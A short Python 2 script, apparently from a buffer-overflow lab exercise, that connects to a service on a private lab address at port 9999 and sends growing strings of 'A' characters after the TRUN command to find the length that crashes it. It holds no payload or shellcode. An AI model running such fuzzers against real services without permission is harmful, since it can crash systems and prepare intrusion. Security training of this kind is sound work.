#!/usr/bin/python

import socket
import os
import sys
import time

host="10.0.2.5"
port=9999

buffer=["A"]
counter=100
while len(buffer) <= 30:
		buffer.append("A"*counter)
		counter=counter+200

for string in buffer:
	print "fuzzing  TRUN with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send("TRUN :./" + string)
	s.recv(1024)
	s.close()
	time.sleep(1)
